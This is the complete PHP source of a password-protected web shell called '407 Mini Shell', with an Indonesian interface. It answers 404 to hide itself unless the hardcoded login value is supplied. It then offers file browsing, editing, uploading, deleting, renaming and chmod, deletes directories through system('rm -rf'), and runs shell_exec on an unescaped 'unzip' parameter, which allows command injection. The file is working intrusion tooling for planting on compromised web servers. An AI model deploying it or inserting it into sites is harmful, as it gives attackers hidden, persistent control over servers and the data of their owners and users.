<?
///////
$pass="herp1337"; // Ganti Password
///////
http_response_code(404);
if(isset($_GET["login"])){
	global $pass;
	if($_GET["login"]==$pass) http_response_code(200);
	else{
		die();
		http_response_code(404);
	}
	
	
}
else die()
///////////////////////////
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<title>407 Mini Shell - Menkrep1337</title>
<body bgcolor="black"></body>
<style>
	#border {
		border: 1px solid white;
		background: black;
		color: white;
	}
	#border2 {
		border: 1px dotted blue;
		background: black;
		width: 130px;
		color: white;
	}
	#fpath {
		color: yellow;
		border: 1px solid red;
		
	}
	#kamvang: {
		overflow-x: scroll;
		width: 100%;
	}
	#file {
		color: #98FF00;
		width: 100%;
		height: 35px;
		overflow-y: scroll;
		overflow-x: scroll;
	}
	a {
		color: white;
		border: 1px dotted #E700FF;
		text-decoration: none;
		margin: 2px;
		display: inline-block;
	}
	#asu {
		border: 1px solid green;
	}
	#asu2 {
		border: 1px solid green;
		background-color: black;
		
	}
	#asu3 {
		border: 1px solid green;
		background-color: black;
		overflow: scroll;
		width: 100%;
	}
	#dir {
		color: yellow;
		width: 100%;
		heigth: 30px;
		overflow-y: scroll;
		overflow-x: scroll;
	}
	#can {
		color: cyan;
		background: black;
	}
	input {
		border-radius: 15px;
		border: 1px solid green;
		color: black;
	}
	#button {
		border-radius: 15px;
		border: 1px solid yellow;
		color: white;
		background: black;
	}
	#hitler {
		border-radius: 15px;
		border: 1px solid cyan;
		color: white;
		background: black;
	}
</style>
	<div id="asu3">
		<tt><font color="lime"><? echo php_uname() ?><br>+----------+</font></tt>
		<br>
		<?
		if(isset($_GET["dir"])){
			$path=$_GET["dir"];
		}
		else{
			$path=getcwd();
		}
		$hit="";
		$nb="";
		$hb="";
		foreach(explode("/",$path ) as $vb){
			$hb .= $vb."/";
			$nb = $vb;
			$hit .= "<a id='fpath' href='?login=$pass&dir=$hb'>$nb/</a>";
		}
			echo "<font color='cyan'>Path: <font color='white'><i>".$hit."</i></font></font>";
		?><br>
		<a href="?login=<? echo $pass; ?>&dir=<? echo $path; ?>&dir=<? echo $path; ?>&folder=<? echo $path; ?>">Buat Folder</a>
		<form method="POST" action="" enctype="multipart/form-data">
			<hr>
			<input type="file" value="Upload" name="berkas" id="button">
				<input type="submit" value="Kirim" id="hitler">
		</form>
	</div>
<?
if(isset($_GET["folder"])){
	$xz=$_GET["folder"];
	echo "
	<form method='POST' action=''>
		<center>
			<hr>
				<input type='hidden' name='fpath' value='$xz'>
				<input type='text' placeholder='Masukkan Nama Folder' name='foldername'>
				<input type='submit' id='button' value='Buat'></input>
		</center>
		</form>
	";
}
if(isset($_GET["rename"])){
	$xz=$_GET["rename"];
	$mod=$_GET["mod"];
	echo "
	<form method='POST' action=''>
		<center>
			<hr>
				<input type='hidden' name='mod' value='$mod'>
				<input type='hidden' name='ren' value='$xz'>
				<input type='text' placeholder='Masukkan Nama Ganti' name='change'>
				<input type='submit' id='button' value='Ganti'></input>
		</center>
		</form>
	";
}
if(isset($_GET["chmod"])){
	$xz=$_GET["chmod"];
	$perms=substr(fileperms($xz),-4);
	echo "
	<form method='POST' action=''>
		<center>
			<hr>
				<input type='hidden' name='lchmod' value='$xz'>
				<input style='text-align: center;' type='text' placeholder='Masukkan Angka Permission' value='$perms' name='chmod'>
				<input type='submit' id='button' value='Ganti'></input>
		</center>
		</form>
	";
}
?>
<?
if($_SERVER["REQUEST_METHOD"]=="POST"){
	if(isset($_POST["chmod"])){
		$jalur=$_POST["lchmod"];
		$kode=$_POST["chmod"];
		chmod($jalur,$kode);
		echo "<script>window.history.back()</script>";
	}
	if(isset($_POST["fpath"])){
		$title=$_POST["foldername"];
		$lokasi=$_POST["fpath"];
		mkdir($lokasi."/".$title);
		echo "<script>window.history.back()</script>";
	}
	if(isset($_POST["change"])){
		$awal=$_POST["ren"];
		$yamato=$_POST["mod"];
		$matilda=$_POST["change"];
		rename($awal,$yamato."/".$matilda);
		echo "<script>window.history.back()</script>";
	}
	if(isset($_POST["content"])){
		$isi=$_POST["content"];
		$location=$_POST["location"];
		file_put_contents($location,$isi);
		echo "<script>window.history.back()</script>";
	}
}
if(isset($_GET["open"])){
	$files=$_GET["open"];
	$content=file_get_contents($files);
	echo '<form method="POST" action="">';
	echo "
	<center><textarea rows=20 cols=45 id='asu' name='content'>$content</textarea>
	<br>
	<input type='hidden' value='$files' name='location'></input>
	<input type='submit' id='border2' value='Simpan Berkas Ini'></input>
	</form>
	<hr>";
	die();
}
?>
<div id="border">
<?
//
if(isset($_GET["dir"])){
	$path=$_GET["dir"];
}
else{
	$path=getcwd();
}
$list=scandir($path);
foreach($list as $item){
	global $pass;
	if($item==".." || $item=="."){
		echo "
		<div id=\"dir\">$item</div><br>
		<a href='?login=$pass&dir=$path/$item'>Open Folder</a>
		<br><hr>";
		continue;
	}
	if(is_file($path."/".$item)){
		$size=filesize($path."/".$item);
		$iszip=pathinfo($path."/".$item);
		if($iszip["extension"]=="zip") $load="<a href='?login=$pass&unzip=$path/$item'>Unzip</a>";
		else $load="";
		echo "
		<div id=\"file\">$item <font color='white'>- $size Bytes</font></div>
			<div id=\"kamvang\">
		<a href='?login=$pass&open=$path/$item'>Edit File</a>
		<a href='?login=$pass&unlink=$path/$item'>Hapus File</a>
		<a href='?login=$pass&rename=$path/$item&mod=$path'>Rename</a>
		$load
		<a href='$path/item' download='$item'>Download</a>
		<a href='?login=$pass&chmod=$path/$item'>Chmod</a>
		<br><hr></div>";
	}
	else{
		echo "
		<div id=\"dir\">$item</div><br>
			<div id=\"kamvang\">
		<a href='?login=$pass&dir=$path/$item'>Open Folder</a>
		<a href='?login=$pass&dir=$path&rmdir=$path/$item'>Delete</a>
		<a href='?login=$pass&rename=$path/$item&mod=$path'>Rename</a>
		<a href='?login=$pass&chmod=$path/$item'>Chmod</a>
		<br><hr></div>";
	}
}
?>
</div>
<?
function hapus($folder){
	system("rm -rf ".escapeshellarg($folder),$value);
	return $value;
}
if(isset($_GET["rmdir"])){
	$test=hapus($_GET["rmdir"]);
	if($test==0) echo "<script>alert('Berhasil Menghapus Folder');window.history.back()</script>";
	else echo "<script>alert('Gagal Menghapus Folder');window.history.back()</script>";
}
if(isset($_GET["unlink"])){
	$test=unlink($_GET["unlink"]);
	if($test==true) echo "<script>alert('Berhasil Menghapus Berkas');window.history.back()</script>";
	else echo "<script>alert('Gagal Menghapus Berkas');window.history.back()</script>";
}
if(isset($_GET["unzip"])){
	$zip=$_GET["unzip"];
	if(shell_exec("unzip -o $zip")){
		echo "<script>alert('Berhasil Extract Berkas');window.history.back()</script>";
	}
	else echo "<script>alert('Gagal Extract Berkas');window.history.back()</script>";
}
if(isset($_FILES["berkas"])){
	$fnama=$_FILES["berkas"]["name"];
	$ftmp=$_FILES["berkas"]["tmp_name"];
	$ussr=move_uploaded_file($ftmp,$_GET["dir"].$fnama);
	if($ussr){
		echo "<script>alert('Upload Berhasil')</script>";
	}
	else{
		echo "<script>alert('Upload Gagal')</script>";
	}
}
?>